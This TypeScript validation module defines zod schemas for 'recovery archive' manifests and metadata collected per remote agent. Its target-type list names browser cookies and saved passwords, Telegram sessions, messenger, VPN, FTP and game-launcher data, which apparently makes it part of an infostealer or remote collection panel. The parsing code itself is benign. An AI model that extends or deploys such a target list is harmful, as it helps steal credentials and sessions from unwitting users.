import path from 'path/posix';
import { z } from 'zod';
import type {
	RecoveryArchive,
	RecoveryArchiveManifestEntry,
	RecoveryArchiveTargetSummary
} from '$lib/types/recovery';

const RECOVERY_TARGET_TYPES = [
	'chromium-history',
	'chromium-bookmarks',
	'chromium-cookies',
	'chromium-passwords',
	'gecko-history',
	'gecko-bookmarks',
	'gecko-cookies',
	'gecko-passwords',
	'minecraft-saves',
	'minecraft-config',
	'telegram-session',
	'pidgin-data',
	'psi-data',
	'discord-data',
	'slack-data',
	'element-data',
	'icq-data',
	'signal-data',
	'viber-data',
	'whatsapp-data',
	'skype-data',
	'tox-data',
	'nordvpn-data',
	'openvpn-data',
	'protonvpn-data',
	'surfshark-data',
	'expressvpn-data',
	'cyberghost-data',
	'foxmail-data',
	'mailbird-data',
	'outlook-data',
	'thunderbird-data',
	'cyberduck-data',
	'filezilla-data',
	'winscp-data',
	'growtopia-data',
	'roblox-data',
	'battlenet-data',
	'ea-app-data',
	'epic-games-data',
	'steam-data',
	'ubisoft-connect-data',
	'gog-galaxy-data',
	'riot-client-data',
	'custom-path'
] as const;

export const MAX_MANIFEST_ENTRIES = 10000;
export const MAX_TARGET_SUMMARIES = 256;

function sanitizeTrimmedString(value: unknown): string {
	if (typeof value !== 'string') {
		throw new Error('Value must be a string');
	}
	const trimmed = value.trim();
	if (!trimmed) {
		throw new Error('Value must not be empty');
	}
	if (Array.from(trimmed).some((char) => char.charCodeAt(0) <= 0x1f)) {
		throw new Error('Value contains disallowed control characters');
	}
	return trimmed;
}

export function normalizeArchiveEntryPath(value: unknown): string {
	const trimmed = sanitizeTrimmedString(value);
	const withoutBackslashes = trimmed.replace(/\\+/g, '/');
	const normalized = path.normalize(withoutBackslashes);
	if (!normalized || normalized === '.' || normalized.startsWith('../')) {
		throw new Error('Path resolves outside of archive root');
	}
	if (/^\.\./.test(normalized)) {
		throw new Error('Path resolves outside of archive root');
	}
	return normalized;
}

function dedupeStrings(values: string[] | undefined): string[] | undefined {
	if (!values || values.length === 0) {
		return undefined;
	}
	const unique = Array.from(new Set(values.map((value) => value.trim()).filter(Boolean)));
	return unique.length > 0 ? unique : undefined;
}

const optionalTrimmedString = z
	.string()
	.transform((value) => value.trim())
	.transform((value) => (value.length === 0 ? undefined : value))
	.optional();

const recoveryTargetSummarySchema = z
	.object({
		type: z.enum(RECOVERY_TARGET_TYPES),
		label: optionalTrimmedString,
		path: optionalTrimmedString,
		paths: z.array(z.string()).optional(),
		recursive: z.boolean().optional(),
		resolvedPaths: z.array(z.string()).optional(),
		totalEntries: z.number().int().nonnegative().optional(),
		totalBytes: z.number().int().nonnegative().optional()
	})
	.transform((value) => ({
		...value,
		paths: dedupeStrings(value.paths),
		resolvedPaths: dedupeStrings(value.resolvedPaths)
	})) satisfies z.ZodType<RecoveryArchiveTargetSummary>;

const recoveryManifestEntrySchema = z.object({
	path: z.string().transform((value, ctx) => {
		try {
			return normalizeArchiveEntryPath(value);
		} catch (err) {
			ctx.addIssue({
				code: z.ZodIssueCode.custom,
				message: err instanceof Error ? err.message : 'Invalid manifest path'
			});
			return z.NEVER;
		}
	}),
	size: z.number().int().nonnegative(),
	modifiedAt: z
		.string()
		.trim()
		.refine((value) => !Number.isNaN(Date.parse(value)), {
			message: 'Invalid modification timestamp'
		})
		.transform((value) => new Date(value).toISOString()),
	mode: z
		.string()
		.trim()
		.refine((value) => /^[0-7]{3,4}$/.test(value), {
			message: 'Invalid file mode'
		}),
	type: z.enum(['file', 'directory']),
	target: z.string().trim().min(1),
	sourcePath: optionalTrimmedString,
	preview: z.string().optional(),
	previewEncoding: z.enum(['utf-8', 'base64']).optional(),
	truncated: z.boolean().optional()
}) satisfies z.ZodType<RecoveryArchiveManifestEntry>;

const recoveryManifestSchema = z
	.array(recoveryManifestEntrySchema)
	.max(MAX_MANIFEST_ENTRIES, `Manifest cannot exceed ${MAX_MANIFEST_ENTRIES} entries.`);

const recoveryTargetsSchema = z
	.array(recoveryTargetSummarySchema)
	.max(MAX_TARGET_SUMMARIES, `Target summary cannot exceed ${MAX_TARGET_SUMMARIES} entries.`);

export type NormalizedRecoveryArchiveManifestEntry = z.infer<typeof recoveryManifestEntrySchema>;
export type NormalizedRecoveryArchiveTargetSummary = z.infer<typeof recoveryTargetSummarySchema>;

export function parseRecoveryManifestEntries(
	value: unknown
): NormalizedRecoveryArchiveManifestEntry[] {
	const entries = recoveryManifestSchema.parse(value);
	const seen = new Set<string>();
	for (const entry of entries) {
		if (seen.has(entry.path)) {
			throw new Error(`Duplicate manifest entry for path ${entry.path}`);
		}
		seen.add(entry.path);
	}
	return entries.sort((a, b) => a.path.localeCompare(b.path, undefined, { sensitivity: 'base' }));
}

export function parseRecoveryTargetSummaries(
	value: unknown
): NormalizedRecoveryArchiveTargetSummary[] {
	return recoveryTargetsSchema
		.parse(value)
		.sort((a, b) =>
			(a.label || a.type).localeCompare(b.label || b.type, undefined, { sensitivity: 'base' })
		);
}

const storedArchiveMetadataSchema = z.object({
	id: z.string().uuid(),
	agentId: z.string().trim().min(1),
	requestId: z.string().trim().min(1),
	createdAt: z
		.string()
		.trim()
		.refine((value) => !Number.isNaN(Date.parse(value)), {
			message: 'Invalid creation timestamp'
		})
		.transform((value) => new Date(value).toISOString()),
	name: z.string().trim().min(1),
	size: z.number().int().nonnegative(),
	sha256: z.string().regex(/^[0-9a-f]{64}$/),
	targets: recoveryTargetsSchema,
	entryCount: z.number().int().nonnegative(),
	notes: optionalTrimmedString,
	archiveFile: z
		.string()
		.trim()
		.refine((value) => !value.includes('/') && !value.includes('\\'), {
			message: 'Archive filename must not contain path separators'
		}),
	manifestFile: z
		.string()
		.trim()
		.refine((value) => !value.includes('/') && !value.includes('\\'), {
			message: 'Manifest filename must not contain path separators'
		})
}) satisfies z.ZodType<
	RecoveryArchive & {
		archiveFile: string;
		manifestFile: string;
	}
>;

export type StoredArchiveMetadata = z.infer<typeof storedArchiveMetadataSchema>;

export function parseStoredArchiveMetadata(value: unknown): StoredArchiveMetadata {
	return storedArchiveMetadataSchema.parse(value);
}
